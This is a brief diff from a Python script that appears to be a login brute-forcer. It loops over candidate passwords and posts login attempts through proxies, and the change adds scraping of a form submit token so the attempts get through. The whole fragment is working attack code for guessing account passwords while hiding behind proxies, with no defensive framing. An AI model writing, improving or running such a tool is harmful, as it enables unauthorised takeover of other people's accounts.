@@ -165,7 +165,11 @@ for pss in ps:
                 #except:
                     #pass
             rq = requests.post(server, headers=headers, data=data, proxies=proxi)
-            _rq_ = BeautifulSoup(rq.text , 'html.parser')
+            r = requests.get(server,headers=headers, proxies=proxi)
+            _rq_ = BeautifulSoup(r.text , 'html.parser')
+            _req_ = _rq_.find('input')['submit']
+            data = {'username': user, 'password': pss, 'uuid':uid, 'from_reg':'false', '_csrftoken': 'missing','login_attempt_countn':'0','submit':_req_}
+            rq = requests.post(server, headers=headers, data=data, proxies=proxi)    
             #if rq.status_code != 200:
                 #time.sleep(1)
                 #print ('\n\033[31m[!] check network or use vps\n')
